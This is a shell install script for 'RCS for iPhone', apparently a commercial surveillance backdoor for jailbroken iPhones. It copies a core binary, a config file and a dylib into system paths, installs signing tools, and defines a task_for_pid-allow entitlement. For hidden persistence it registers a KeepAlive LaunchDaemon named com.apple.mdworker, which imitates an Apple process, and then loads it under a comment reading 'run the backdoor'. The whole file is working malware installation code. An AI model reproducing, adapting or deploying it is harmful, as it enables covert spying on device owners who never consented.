#!/bin/sh

# GLOBAL VARS
RCS_DIR=[:RCS_DIR:]
RCS_CORE=[:RCS_CORE:]
RCS_CONF=[:RCS_CONF:]
RCS_DYLIB=[:RCS_DYLIB:]
RCS_LOG=./install.log
RCS_BASE=/var/mobile
RCS_LAUNCHD_NAME=com.apple.mdworker
RCS_PLIST="<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n \
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n \
<plist version=\"1.0\">\n \
<dict>\n \
	<key>Label</key>\n \
	<string>$RCS_LAUNCHD_NAME</string>\n \
	<key>KeepAlive</key>\n \
	<true/>\n \
	<key>ThrottleInterval</key>\n \
	<integer>3</integer> \n \
	<key>WorkingDirectory</key>\n \
	<string>$RCS_BASE/$RCS_DIR</string>\n \
	<key>ProgramArguments</key>\n \
	<array>\n \
		<string>$RCS_BASE/$RCS_DIR/$RCS_CORE</string>\n \
	</array>\n \
</dict>\n \
</plist>"

RCS_ENT_NAME=ent.plist

RCS_ENT_FILE="<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n \
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n \
<plist version=\"1.0\"><dict><key>task_for_pid-allow</key><true/></dict></plist>"

#INFO
echo "**** RCS for iPhone installation script verions 1.1 ****" > $RCS_LOG
echo running installation... >> $RCS_LOG
echo RCS Folder path : "$RCS_BASE/$RCS_DIR" >> $RCS_LOG
echo Core name       : "$RCS_CORE" >> $RCS_LOG
echo Conf name       : "$RCS_CONF" >> $RCS_LOG
echo Dynamic lib name: "$RCS_DYLIB" >> $RCS_LOG
echo >> $RCS_LOG

# removing older rcs folder
echo -n  $0: `date` - rm -rf  $RCS_BASE/$RCS_DIR >> $RCS_LOG
RET_VAL=`rm -rf $RCS_BASE/$RCS_DIR 2>&1`

if [ -d $RCS_BASE/$RCS_DIR ]
 then
  echo ... error: $RET_VAL. >> $RCS_LOG
  exit 1
 else
  echo ... done! >> $RCS_LOG
fi

# removing older rcs dylib
echo -n  $0: `date` - rm -f  /usr/lib/$RCS_DYLIB >> $RCS_LOG
RET_VAL=`rm -f /usr/lib/$RCS_DYLIB 2>&1`

if [ -f /usr/lib/$RCS_DYLIB ]
 then
  echo ... error: $RET_VAL. >> $RCS_LOG
  exit 1
 else
  echo ... done! >> $RCS_LOG
fi

# create rcs folder
echo -n  $0: `date` - mkdir $RCS_BASE/$RCS_DIR >> $RCS_LOG
RET_VAL=`mkdir $RCS_BASE/$RCS_DIR 2>&1`

if [ -d $RCS_BASE/$RCS_DIR ]
 then
  echo ... done! >> $RCS_LOG
 else
  echo ... error: $RET_VAL. >> $RCS_LOG
  exit 2
fi

# set attrib for tool
echo -n $0: `date` - chmod 755 ./codesign_allocate >> $RCS_LOG
RCS_RET=`chmod 755 ./codesign_allocate 2>&1`

if [ $? -eq 0 ]
 then
  echo ... done! >> $RCS_LOG
 else
  echo ... error: $RET_VAL.>> $RCS_LOG
  exit 7
fi

echo -n $0: `date` - chmod 755 ./ldid >> $RCS_LOG
RCS_RET=`chmod 755 ./ldid 2>&1`

if [ $? -eq 0 ]
 then
  echo ... done! >> $RCS_LOG
 else
  echo ... error: $RET_VAL.>> $RCS_LOG
  exit 7
fi

# moving codisign tool
echo -n $0: `date` - cp ./codesign_allocate /usr/bin/codesign_allocate >> $RCS_LOG
RET_VAL=`cp ./codesign_allocate /usr/bin/codesign_allocate 2>&1`

if [ -e /usr/bin/codesign_allocate ]
 then
  echo ... done! >> $RCS_LOG
 else
  echo ... error: $RET_VAL.>> $RCS_LOG
  exit 3
fi

# moving ldid tool
echo -n $0: `date` - cp ./ldid /usr/bin/ldid >> $RCS_LOG
RET_VAL=`cp ./ldid /usr/bin/ldid 2>&1`

if [ -e /usr/bin/ldid ]
 then
  echo ... done! >> $RCS_LOG
 else
  echo ... error: $RET_VAL.>> $RCS_LOG
  exit 4
fi

# moving components
echo -n $0: `date` - cp ./$RCS_CORE $RCS_BASE/$RCS_DIR/$RCS_CORE >> $RCS_LOG
RET_VAL=`cp ./$RCS_CORE $RCS_BASE/$RCS_DIR/$RCS_CORE 2>&1`

if [ -e $RCS_BASE/$RCS_DIR/$RCS_CORE ]
 then
  echo ... done! >> $RCS_LOG
 else
  echo ... error: $RET_VAL.>> $RCS_LOG
  exit 5
fi

echo -n $0: `date` - cp ./$RCS_CONF $RCS_BASE/$RCS_DIR/$RCS_CONF >> $RCS_LOG
RET_VAL=`cp ./$RCS_CONF $RCS_BASE/$RCS_DIR/$RCS_CONF 2>&1`

if [ -e $RCS_BASE/$RCS_DIR/$RCS_CONF ]
 then
  echo ... done! >> $RCS_LOG
 else
  echo ... error: $RET_VAL. >> $RCS_LOG
  exit 6
fi

echo -n $0: `date` - cp ./$RCS_DYLIB /usr/lib/$RCS_DYLIB >> $RCS_LOG
RET_VAL=`cp ./$RCS_DYLIB /usr/lib/$RCS_DYLIB 2>&1`

if [ -e /usr/lib/$RCS_DYLIB ]
 then
  echo ... done! >> $RCS_LOG
 else
  echo ... error: $RET_VAL. >> $RCS_LOG
  exit 6
fi

# set attrib for dylib (cydia installer)
echo -n $0: `date` - chmod 766 /usr/lib/$RCS_DYLIB >> $RCS_LOG
RCS_RET=`chmod 766 /usr/lib/$RCS_DYLIB 2>&1`

if [ $? -eq 0 ]
 then
  echo ... done! >> $RCS_LOG
 else
  echo ... error: $RET_VAL.>> $RCS_LOG
  exit 7
fi

# set attrib
echo -n $0: `date` - chmod 755 $RCS_BASE/$RCS_DIR/$RCS_CORE >> $RCS_LOG
RCS_RET=`chmod 755 $RCS_BASE/$RCS_DIR/$RCS_CORE 2>&1`

if [ $? -eq 0 ]
 then
  echo ... done! >> $RCS_LOG
 else
  echo ... error: $RET_VAL.>> $RCS_LOG
  exit 8
fi

# create launchd plist
echo -e $RCS_PLIST > /Library/LaunchDaemons/$RCS_LAUNCHD_NAME.plist

if [ -e /Library/LaunchDaemons/$RCS_LAUNCHD_NAME.plist ]
 then
  echo ... done! >> $RCS_LOG
 else
  echo ... error: $RET_VAL. >> $RCS_LOG
  exit 9
fi

# run the backdoor
echo -n $0: `date` - running $RCS_BASE/$RCS_DIR/$RCS_CORE >> $RCS_LOG
# (cd $RCS_BASE/$RCS_DIR; $RCS_BASE/$RCS_DIR/$RCS_CORE > /dev/null 2>&1 ) & 
/bin/launchctl load /Library/LaunchDaemons/$RCS_LAUNCHD_NAME.plist
echo ... done! >> $RCS_LOG

echo >> $RCS_LOG
echo " RCS folder content: $RCS_BASE/$RCS_DIR" >> $RCS_LOG
echo >> $RCS_LOG
ls -la $RCS_BASE/$RCS_DIR >> $RCS_LOG

echo >> $RCS_LOG
echo $0: "installation done." >> $RCS_LOG

exit 0
